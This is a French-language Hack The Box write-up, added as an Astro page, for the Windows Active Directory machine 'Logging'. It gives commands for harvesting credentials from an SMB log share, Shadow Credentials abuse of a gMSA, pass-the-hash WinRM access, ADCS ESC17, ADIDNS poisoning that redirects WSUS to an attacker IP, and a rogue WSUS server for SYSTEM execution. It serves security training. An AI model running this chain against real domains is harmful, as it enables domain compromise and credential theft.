@@ -1,0 +1,146 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - Logging">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Logging</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-medium">Medium</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Windows Server 2019 — Active Directory</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">21 Apr 2026</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #e67e22; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Medium Windows AD — fuite de credentials dans un log SMB avec piège de rotation annuelle, abus gMSA via Shadow Credentials (erreur PKINIT à déboguer), DLL hijack + ADCS ESC17, empoisonnement DNS AD-intégré, puis serveur WSUS rogue pour obtenir SYSTEM.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'SMB READ \\\\DC01\\Logs', r:'IdentitySync_Trace.log → credentials svc_recovery (piège rotation annuelle)' },
+        { n:'2', v:'GenericWrite sur msa_health$ (gMSA)', r:'Shadow Credentials → hash NT gMSA' },
+        { n:'3', v:'WinRM msa_health$', r:'Shell sur DC01' },
+        { n:'4', v:'DLL hijack via tâche planifiée', r:'Certificat ADCS ESC17 wsus.logging.htb' },
+        { n:'5', v:'ADIDNS poisoning + WSUS rogue (wsuks)', r:'DC exécute payload en SYSTEM → root flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#e67e2222; color:#e67e22; border:1px solid #e67e2244;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Setup & Reconnaissance</h2>
+    <p>Credentials de départ fournis : <strong>wallace.everette / Welcome2026@</strong></p>
+    <pre is:raw>sudo sed -i 's/&lt;ANCIENNE_IP&gt;/&lt;NOUVELLE_IP&gt;/g' /etc/hosts
+echo "10.129.24.8  DC01.logging.htb logging.htb wsus.logging.htb" >> /etc/hosts
+sudo ntpdate -u logging.htb    # Synchronisation NTP obligatoire
+
+nmap -sC -sV -Pn 10.129.24.8
+
+PORT     STATE SERVICE
+53/tcp   open  DNS
+88/tcp   open  Kerberos
+389/tcp  open  LDAP        Domain: logging.htb
+445/tcp  open  SMB
+5985/tcp open  WinRM
+8530/tcp open  WSUS HTTP   ← indice capital pour la technique finale
+8531/tcp open  WSUS HTTPS  ← indice capital pour la technique finale</pre>
+
+    <h2>2 — Fuite de Credentials via Log SMB</h2>
+    <pre is:raw>nxc smb logging.htb -u 'wallace.everette' -p 'Welcome2026@' -M spider_plus
+# Share Logs accessible — 4 fichiers dont IdentitySync_Trace_20260219.log
+
+mkdir -p Logs && cd Logs
+smbclient //logging.htb/Logs -U 'LOGGING/wallace.everette%Welcome2026@' \
+  -c 'recurse ON; prompt OFF; mget *'
+
+cat IdentitySync_Trace_20260219.log
+# ConnectionContext Dump: {
+#   BindUser: "LOGGING\svc_recovery",
+#   BindPass: "Em3rg3ncyPa$$2025"   ← ATTENTION : log de 2025 !
+# }</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ PIÈGE : Le mot de passe dans le log est Em3rg3ncyPa$$2025. La politique de rotation annuelle a mis à jour le credential. Mot de passe actuel : Em3rg3ncyPa$$2026. Observer les erreurs LDAP_INVALID_CREDENTIALS plus bas dans le log pour le confirmer.</div>
+    <pre is:raw># svc_recovery est dans Protected Users → NTLM bloqué, Kerberos uniquement
+getTGT.py 'LOGGING.HTB/svc_recovery:Em3rg3ncyPa$$2026'
+export KRB5CCNAME=svc_recovery.ccache</pre>
+
+    <h2>3 — Shadow Credentials sur gMSA (msa_health$)</h2>
+    <p>BloodHound révèle que svc_recovery a GenericWrite sur MSA_HEALTH$ (gMSA).</p>
+    <pre is:raw>bloodyAD -H dc01.logging.htb -d logging.htb -u 'svc_recovery' -k \
+    add shadowCredentials 'MSA_HEALTH$'</pre>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ ERREUR KDC_ERR_PADATA_TYPE_NOSUPP : Le krb5.conf initial manque les directives PKINIT. Enrichir avec :<br/><br/>
+[libdefaults]<br/>
+  pkinit_anchors = DIR:/etc/ssl/certs<br/>
+[realms]<br/>
+  LOGGING.HTB = {'{'}<br/>
+    pkinit_anchors = DIR:/etc/ssl/certs<br/>
+    pkinit_eku_checking = kpServerAuth<br/>
+    pkinit_kdc_hostname = DC01.logging.htb<br/>
+  {'}'}</div>
+    <div style="border-left:3px solid #f87171; background:rgba(239,68,68,0.06); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fca5a5;">⚠️ certipy-ad introuvable : Le binaire s'appelle certipy (sans suffixe ad). Localiser avec : find / -name 'certipy*' 2>/dev/null</div>
+    <pre is:raw># Une fois le krb5.conf corrigé :
+# [+] NT: [HASH_NT_REDACTED]
+# Le hash NT du gMSA est stable entre les resets HTB
+
+evil-winrm -i dc01.logging.htb -u 'msa_health$' -H [HASH_NT_REDACTED]</pre>
+
+    <h2>4 — DLL Hijack + ADCS ESC17 + WSUS Rogue</h2>
+    <p>Depuis le shell msa_health$, une tâche planifiée charge une DLL depuis un chemin contrôlable. L'exploiter pour soumettre un CSR au template ADCS <strong>UpdateSrv</strong> (ESC17) et obtenir un certificat pour wsus.logging.htb.</p>
+    <pre is:raw># Étape 1 — DLL hijack → obtenir un certificat ESC17 pour wsus.logging.htb
+# (template UpdateSrv permet de spécifier un SAN arbitraire)
+
+# Étape 2 — Empoisonnement DNS AD-intégré
+python3 dnstool.py -u 'logging\msa_health$' -H [HASH] \
+  -r wsus.logging.htb --data 10.10.14.51 --action add 10.129.24.8
+
+# Étape 3 — Serveur WSUS rogue (wsuks) avec le certificat CA obtenu
+# Le DC contacte wsus.logging.htb:8531 et exécute notre payload en SYSTEM
+
+cat /root/root.txt</pre>
+    <div style="border-left:3px solid #facc15; background:rgba(250,204,21,0.05); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fde68a;">💡 Les ports 8530/8531 (WSUS) visibles dès le scan Nmap initial étaient l'indice de la technique finale.</div>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Lire TOUS les fichiers d\'un share SMB — les logs contiennent souvent des credentials en clair',
+        'Piège rotation annuelle : log de 2025 → credential mis à jour en 2026',
+        'Protected Users = Kerberos uniquement — krb5.conf avec directives PKINIT obligatoire',
+        'gMSA + GenericWrite = Shadow Credentials → hash NT sans brute force',
+        'ADCS ESC17 : variante de ESC1, chercher les flags de nommage (msPKI-Certificate-Name-Flag)',
+        'WSUS rogue = l\'une des techniques d\'exécution SYSTEM les plus puissantes en AD',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','nxc','smbclient','bloodyAD','bloodhound','evil-winrm','certipy','dnstool.py','wsuks'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
